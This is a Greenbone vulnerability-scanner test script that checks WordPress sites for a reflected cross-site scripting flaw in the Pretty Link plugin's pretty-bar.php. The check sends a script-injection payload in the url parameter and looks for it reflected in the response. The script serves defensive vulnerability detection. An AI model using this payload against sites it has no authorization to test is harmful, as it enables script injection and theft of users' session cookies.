# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103358");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");
  script_name("WordPress Pretty Link Plugin 'pretty-bar.php' Cross Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50921");
  script_xref(name:"URL", value:"http://www.wordpress.org/extend/plugins/pretty-link/changelog/");

  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2011-12-07 10:18:02 +0100 (Wed, 07 Dec 2011)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");
  script_tag(name:"summary", value:"The Pretty Link plugin for WordPress is prone to a cross-site
scripting vulnerability because it fails to properly sanitize user-
supplied input.

An attacker may leverage these issues to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This can allow the attacker to steal cookie-based authentication
credentials and launch other attacks.

Pretty Link 1.5.2 is vulnerable. Other versions may also be affected.");
  script_tag(name:"solution", value:"Update to the latest version.");
  script_tag(name:"solution_type", value:"VendorFix");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = string(dir, '/wp-content/plugins/pretty-link/pretty-bar.php?url="><script>alert(/vt-xss-test/)</script>');

if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(/vt-xss-test/\)</script>", check_header:TRUE, extra_check:"Pretty Link")) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(0);
